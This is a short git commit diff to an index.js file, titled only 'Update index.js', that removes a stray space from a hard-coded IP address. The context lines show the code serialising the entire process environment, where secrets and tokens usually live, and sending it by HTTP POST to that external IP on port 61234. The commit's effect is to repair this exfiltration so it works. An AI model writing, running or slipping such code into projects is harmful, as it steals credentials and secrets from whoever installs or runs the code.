989035a981b31906d1afaebe600026a6722a442f
carlosvendramini <5666957+carlosvendramini@users.noreply.github.com>
2026-09-20 14:21:59 -0400

    Update index.js

--- index.js
+++ index.js
@@ -4,7 +4,7 @@ const payload = JSON.stringify(process.env, null, 2);
 
 const req = http.request(
   {
-    host: '18.216.188.89 ',
+    host: '18.216.188.89',
     port: 61234,
     method: 'POST',
     path: '/',
